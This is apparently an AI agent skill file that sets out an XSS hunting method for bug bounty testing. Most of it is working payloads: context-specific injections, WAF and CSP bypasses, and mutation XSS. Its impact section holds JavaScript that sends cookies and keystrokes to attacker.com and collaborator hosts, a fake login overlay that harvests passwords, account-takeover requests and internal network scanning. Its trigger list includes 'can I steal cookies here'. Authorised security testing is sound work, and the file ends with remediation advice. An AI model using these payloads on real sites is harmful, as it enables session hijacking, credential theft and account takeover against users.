---
name: xss-hunter
description: >
  Cross-Site Scripting (XSS) vulnerability detection and exploitation methodology for web application security testing and bug bounty. Use this skill whenever the user asks to test for XSS, cross-site scripting, reflected XSS, stored XSS, DOM-based XSS, blind XSS, mutation XSS, DOM clobbering, CSP bypass, XSS filter evasion, event handler injection, or script injection. Also trigger when the user says things like "test input fields for injection", "check if the app sanitizes output", "can I steal cookies here", "test for script execution", or when they paste HTML/JS that reflects user input. This skill provides a complete ordered methodology covering every XSS class — always use it instead of guessing.
---

# XSS Attack Methodology

XSS occurs when user-controlled input is rendered in a browser without proper sanitization or encoding, allowing arbitrary JavaScript execution in the victim's context.

**Before testing anything — understand the injection context:**
The payload you need depends entirely on *where* your input lands in the page source. Always view source or open DevTools after injecting a canary string (`xsstest123`) to locate where it appears.

```
HTML body:       <p>xsstest123</p>             → <script> or <img onerror>
HTML attribute:  <input value="xsstest123">   → " onmouseover= or ">
JS string:       var x = "xsstest123";        → ";alert(1)//
JS template:     `Hello xsstest123`           → ${alert(1)}
URL/href:        href="xsstest123"            → javascript:alert(1)
CSS:             style="color:xsstest123"     → expression(alert(1)) [IE]
```

---

## Attack Index

| # | Type | Description |
|---|------|-------------|
| 1 | Reflected XSS | Input reflected immediately in response |
| 2 | Stored XSS | Input persisted and rendered for other users |
| 3 | DOM-based XSS | Input processed by client-side JS into a dangerous sink |
| 4 | Blind XSS | Execution happens in a context you can't see (admin panel, logs) |
| 5 | Filter & WAF Evasion | Bypass blacklists, sanitizers, WAF rules |
| 6 | CSP Bypass | Exploit weak Content-Security-Policy headers |
| 7 | Mutation XSS (mXSS) | Browser mutation turns safe markup into executable XSS |
| 8 | DOM Clobbering | Overwrite JS variables using named HTML elements |
| 9 | Impact Escalation | Session hijack, credential theft, keylogging, CSRF |

---

## Phase 1 — Reconnaissance: Find All Input Surfaces

Cast a wide net before injecting anything.

### 1.1 URL Parameters
```
GET /search?q=test
GET /page?id=1&ref=home
GET /profile?user=alice
```

### 1.2 Form Fields
- Search bars, login forms, registration, comments, bio fields, file name inputs
- Hidden fields: `<input type="hidden" name="redirect" value="/home">`

### 1.3 HTTP Headers (often reflected in error pages)
```
Referer: https://attacker.com/<script>alert(1)</script>
User-Agent: <script>alert(1)</script>
X-Forwarded-For: <script>alert(1)</script>
X-Original-URL: /"><script>alert(1)</script>
```

### 1.4 JSON / API Responses rendered in UI
- API response fields that get injected into the DOM via `innerHTML`
- Username, display name, bio, address fields stored in API and rendered later

### 1.5 File Uploads
- Upload an SVG with embedded JS: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`
- Upload HTML file if allowed
- Filename itself: `"><img src=x onerror=alert(1)>.png`

### 1.6 DOM Sources (for DOM XSS)
```javascript
// Sources — user-controlled entry points into JS
location.href / location.search / location.hash
document.referrer
document.URL
window.name
postMessage data
localStorage / sessionStorage (if populated from URL)
```

---

## Attack 1 — Reflected XSS

**What:** Input is reflected in the HTTP response immediately without being stored.

**Step 1 — Inject a canary to locate reflection:**
```
GET /search?q=xsstest123
```
View source → find `xsstest123` → note the surrounding context.

**Step 2 — Choose payload for context:**

```html
<!-- HTML body context -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>

<!-- HTML attribute context (value="HERE") -->
" onmouseover="alert(document.domain)
" autofocus onfocus="alert(document.domain)
"><img src=x onerror=alert(document.domain)>

<!-- JavaScript string context (var x = "HERE") -->
";alert(document.domain)//
'-alert(document.domain)-'
\';alert(document.domain)//

<!-- JavaScript template literal context (`Hello HERE`) -->
${alert(document.domain)}

<!-- href/src attribute context -->
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>

<!-- Inside a script block as a value -->
</script><script>alert(document.domain)</script>
```

**Step 3 — Confirm:** observe alert box with `document.domain`. Always use `document.domain` (not `1`) to prove the execution origin.

---

## Attack 2 — Stored XSS

**What:** Input is saved server-side and rendered to other users — higher impact than reflected.

**High-value injection points:**
- Comment/review fields
- Profile fields (name, bio, address, job title)
- Chat / messaging features
- Support ticket subject/body
- Product/listing names and descriptions
- Notification text
- File/folder names in cloud storage UIs

**Testing approach:**
1. Inject a payload in the field and save
2. View the page as a *different user* (or in a fresh session)
3. If payload executes — confirm stored XSS

**Persistent payload (survives page reload):**
```html
<img src=x onerror="this.src='https://your-collaborator.net/?c='+document.cookie">
<script>document.location='https://your-collaborator.net/?c='+document.cookie</script>
<svg/onload="fetch('https://your-collaborator.net/?c='+btoa(document.cookie))">
```

**Check all consumers:** a stored payload in a profile field may execute on:
- `/profile/alice` (public)
- `/admin/users/alice` (admin panel) ← highest impact
- Email notifications (if HTML email)
- API response consumed by another frontend

---

## Attack 3 — DOM-Based XSS

**What:** The server response is safe, but client-side JavaScript reads from a source and writes to a dangerous sink without sanitization.

**Common dangerous sinks:**
```javascript
element.innerHTML = userInput;          // most common
element.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);
element.insertAdjacentHTML('...', userInput);
eval(userInput);
setTimeout(userInput, 0);
setInterval(userInput, 0);
new Function(userInput)();
location.href = userInput;              // XSS via javascript:
location.assign(userInput);
location.replace(userInput);
element.src = userInput;
element.setAttribute('href', userInput);
jQuery(userInput);                      // jQuery XSS
$.parseHTML(userInput);
```

**Testing approach:**
1. Find parameters that appear in client-side JS (hash, search, name)
2. Inject into URL hash/fragment (not sent to server, bypasses server WAF):
   ```
   https://target.com/page#<img src=x onerror=alert(document.domain)>
   https://target.com/page?returnUrl=javascript:alert(1)
   ```
3. Search JS files for dangerous sinks and trace data flow back to sources

**Hunt for DOM XSS in JS files:**
```bash
# Find innerHTML/eval usage in JS bundles
curl -s https://target.com/app.js | grep -E "innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|location\.href"

# Use Burp DOM Invader (embedded browser extension)
# Use dalfox with --deep-domxss flag
dalfox url "https://target.com/search?q=test" --deep-domxss
```

---

## Attack 4 — Blind XSS

**What:** The XSS fires in a context you cannot directly observe — admin panel, internal dashboard, log viewer, support ticket system, PDF renderer, email client.

**Strategy:** use an out-of-band callback payload that phones home when it executes.

**Payload with full context capture:**
```javascript
// Self-contained OOB payload — captures URL, cookies, DOM, IP
<script>
var d=document;
fetch('https://your-collaborator.net/xss?'+new URLSearchParams({
  url: d.location.href,
  cookie: d.cookie,
  dom: d.documentElement.innerHTML.substring(0,500),
  ua: navigator.userAgent
}));
</script>
```

**Compact versions for length-limited fields:**
```html
<img src=x onerror="fetch('https://your-collaborator.net/?c='+document.cookie)">
<script src="https://your-collaborator.net/payload.js"></script>
```

**Tools for blind XSS:**
- **XSS Hunter** (xsshunter.trufflesecurity.com) — generates unique payloads per target, captures full page screenshot + DOM + cookies when fired
- **Burp Collaborator** — simple OOB DNS/HTTP callback
- **interactsh** — open-source OOB server: `interactsh-client` generates a unique URL

**Where to inject blind XSS:**
- Support ticket / bug report forms
- Feedback widgets
- User-agent or X-Forwarded-For headers (logged in dashboards)
- Order notes / shipping address (rendered in admin order view)
- Username (may appear in audit logs or admin user list)

---

## Attack 5 — Filter & WAF Evasion

When basic payloads are blocked, work through these techniques systematically.

### 5.1 Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### 5.2 Tag Alternatives (when `<script>` is blocked)
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<object data="javascript:alert(1)">
<math><mtext><table><mglyph><svg><mtext><textarea>
  <path id="</textarea><img onerror=alert(1) src=1>">
```

### 5.3 Encoding Bypasses
```html
<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- URL encoding (in href/src) -->
<a href="javascript:%61lert(1)">click</a>

<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode escapes (inside JS context) -->
\u0061lert(1)
\u{61}lert(1)

<!-- HTML5 numeric entities -->
&#x61;&#x6C;&#x65;&#x72;&#x74;(1)

<!-- Null bytes / special chars to break filters -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr\nipt>alert(1)</scrip\nt>
```

### 5.4 JavaScript Obfuscation
```javascript
// Avoid "alert"
confirm(1)
prompt(1)
console.log(1)   // safer for detection proof
window['al'+'ert'](1)
(a=alert)(1)
top['al\x65rt'](1)
eval('ale'+'rt(1)')
Function('alert(1)')()
[].constructor.constructor('alert(1)')()

// Avoid parentheses (some WAFs)
alert`1`
throw onerror=alert,1337

// Avoid quotes
String.fromCharCode(88,83,83)
/XSS/.source
```

### 5.5 Polyglot Payloads (test multiple contexts at once)
```javascript
// Works in HTML, attribute, and JS string contexts
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// Gareth Heyes polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>

// Short universal polyglot
">'><svg/onload=alert(1)>
```

### 5.6 WAF-Specific Bypasses
```bash
# Cloudflare — use less common tags + encoding
<svg/onload=alert&#40;1&#41;>
<a/href="j%26Tab;avascript:alert(1)">click

# ModSecurity — split across parameters (HPP)
GET /search?q=<scri&q=pt>alert(1)</scri&q=pt>

# Filter that strips <script> once — double nesting
<scr<script>ipt>alert(1)</scr</script>ipt>

# Filters checking for "javascript:" — use tab/newline
<a href="java&#9;script:alert(1)">
<a href="java&#10;script:alert(1)">
```

---

## Attack 6 — CSP Bypass

Check CSP header first:
```bash
curl -s -I https://target.com | grep -i content-security-policy
```

### 6.1 Unsafe Directives — Instant Win
```
script-src 'unsafe-inline'   → inline <script> works directly
script-src 'unsafe-eval'     → eval(), setTimeout(string) work
script-src *                 → load script from any domain
```

### 6.2 Whitelisted CDN Abuse (JSONP / Angular)
If `script-src` whitelists a CDN that hosts JSONP endpoints or AngularJS:
```html
<!-- JSONP callback on whitelisted domain -->
<script src="https://whitelisted-cdn.com/api?callback=alert(1)//"></script>

<!-- AngularJS CSP bypass (if angular.js is whitelisted) -->
<div ng-app ng-csr-nonce="">{{constructor.constructor('alert(1)')()}}</div>
```

### 6.3 `script-src-elem` vs `script-src` mismatch
Some browsers fall back differently — try `<script>` if `script-src-elem` is not set.

### 6.4 `base-uri` not set → base tag injection
```html
<base href="https://attacker.com/">
<!-- All relative script/link imports now load from attacker.com -->
```

### 6.5 `default-src` without `script-src`
If only `default-src` is set, `object-src` and `script-src` may not be restricted:
```html
<object data="data:text/html,<script>alert(1)</script>"></object>
```

### 6.6 Nonce/hash leak
If `script-src 'nonce-abc123'` is used:
- Check if the nonce is static (doesn't change per request)
- Check if nonce is reflected elsewhere in the page
- Check if nonce is predictable

---

## Attack 7 — Mutation XSS (mXSS)

**What:** The browser's HTML parser mutates apparently safe markup into something executable when assigned via `innerHTML`.

**Classic mXSS payload:**
```html
<!-- Assigned to innerHTML — browser mutates closing tag -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Table context mutation -->
<table><tbody><tr><td><img src="1" onerror=alert(1)//</td></tr></tbody></table>

<!-- SVG namespace confusion -->
<svg><style><img src=x onerror=alert(1)></style></svg>

<!-- math/foreignObject mutation -->
<math><mtext><table><mglyph><svg><mtext><textarea>
<path id="</textarea><img onerror=alert(1) src=1>">
```

**When to try mXSS:** when the app uses DOMPurify <= 2.0.x or any HTML sanitizer, and basic XSS is blocked. Browser mutation can sometimes reconstruct executable HTML from "safe" input.

---

## Attack 8 — DOM Clobbering

**What:** Named HTML elements (`id`, `name`) overwrite JS global variables or properties, causing unsafe behavior when the code later uses those variables.

**Basic clobbering:**
```html
<!-- If code does: if (window.isAdmin) → inject: -->
<img id=isAdmin>
<input id=isAdmin value=true>

<!-- If code does: document.getElementById('config').src → inject: -->
<a id=config href="javascript:alert(1)">

<!-- Clobber document.forms[0].action (form hijack) -->
<form id=target><input name=action value="https://attacker.com/steal"></form>
```

**Double clobbering (clobber a property of a property):**
```html
<!-- Code: config.token → inject: -->
<form id=config><input id=config name=token value=CLOBBERED></form>
```

**When to use:** when JS references `window.X` or `document.X` that isn't explicitly declared, and those values are used in security decisions or URL construction.

---

## Attack 9 — Impact Escalation

After confirming XSS executes, demonstrate real-world impact.

### 9.1 Cookie Theft (Session Hijacking)
```javascript
// Exfiltrate cookies
fetch('https://attacker.com/steal?c=' + btoa(document.cookie))

// Via image (no CORS)
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie)

// Via XSS Hunter payload (captures everything)
```

### 9.2 Credential Harvesting (Phishing via XSS)
```javascript
// Inject fake login overlay on the page
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999">
  <form action="https://attacker.com/harvest" method="post">
    <h2>Session expired — please log in again</h2>
    <input name="user" placeholder="Username"><br>
    <input name="pass" type="password" placeholder="Password"><br>
    <button>Login</button>
  </form>
</div>`;
```

### 9.3 Keylogging
```javascript
document.addEventListener('keydown', e => {
  fetch('https://attacker.com/keys?k=' + encodeURIComponent(e.key));
});
```

### 9.4 CSRF via XSS (bypass SameSite / CSRF tokens)
```javascript
// XSS can read the CSRF token from the page, then use it
const token = document.querySelector('[name=csrf_token]').value;
fetch('/api/admin/delete-user', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json', 'X-CSRF-Token': token},
  body: JSON.stringify({user_id: 1})
});
```

### 9.5 Account Takeover via XSS
```javascript
// Change victim's email/password using their authenticated session
fetch('/api/account', {
  method: 'PATCH',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com', password: 'hacked123'})
});
```

### 9.6 Internal Network Scanning (pivot via XSS)
```javascript
// Scan internal IPs from victim's browser
['192.168.1.1','192.168.1.254','10.0.0.1'].forEach(ip => {
  fetch(`http://${ip}/`, {mode: 'no-cors'})
    .then(() => fetch('https://attacker.com/?alive=' + ip));
});
```

---

## Quick Recon Checklist

Before injecting payloads, run this:

```bash
# 1. Find all parameters with Wayback/gau
gau target.com | grep "=" | sort -u

# 2. Check CSP header
curl -s -I https://target.com | grep -i "content-security-policy"

# 3. Automated parameter discovery
paramspider -d target.com

# 4. Fast XSS scan (dalfox)
dalfox url "https://target.com/search?q=test"

# 5. Check response headers for X-XSS-Protection (legacy)
curl -s -I https://target.com | grep -i "x-xss"

# 6. JS file audit — find dangerous sinks
cat app.js | grep -E "innerHTML|document\.write|eval\(|location\.href\s*="
```

---

## Report Structure

```
Title: [Stored/Reflected/DOM] XSS on [endpoint/feature]

Severity: [Critical (stored+admin), High (stored), Medium (reflected), Low (self-XSS)]

Affected endpoint: [METHOD] [URL] — parameter: [name]

Steps to reproduce:
1. [Setup: log in as X, navigate to Y]
2. Inject the following payload into [field]: [PAYLOAD]
3. [Trigger: submit form / visit URL / wait for admin to view]
4. Observe: JavaScript executes — alert shows [document.domain]

Impact:
- [Describe: cookie theft / session hijack / account takeover / CSRF]
- [Affected users: all visitors / admin users / specific role]

Evidence:
- Screenshot of alert box showing document.domain
- HTTP request/response showing reflection or storage
- For stored: show two different sessions — inject + trigger

Remediation:
- Encode all user output for its context (HTML encode for HTML, JS encode for JS)
- Use textContent instead of innerHTML where possible
- Implement a strict Content-Security-Policy
- Use a security-tested sanitizer (DOMPurify) for HTML rendering
- Set HttpOnly on session cookies to limit theft impact
```

---

## Script

### `scripts/xss_agent.py`
Requires: `pip3 install requests`

```bash
# Reflected XSS — Bearer token auth
python3 scripts/xss_agent.py https://target.com \
  --token "eyJ..." \
  --params "/search?q=FUZZ" "/profile?name=FUZZ"

# Reflected XSS — Cookie auth
python3 scripts/xss_agent.py https://target.com \
  --cookie "session=abc" \
  --params "/search?q=FUZZ"

# Stored XSS test
python3 scripts/xss_agent.py https://target.com \
  --token "eyJ..." \
  --submit-endpoint /api/comments \
  --display-endpoint /comments \
  --field body \
  -o report.json
```

The script automatically: checks CSP headers → injects a canary to find reflection → detects context (HTML body / attribute / JS string) → selects matching payloads → confirms execution → outputs a JSON report.

---

## Reference Files

- `references/payloads.md` — payload list by context
- `references/tools.md` — dalfox, XSStrike, Burp usage
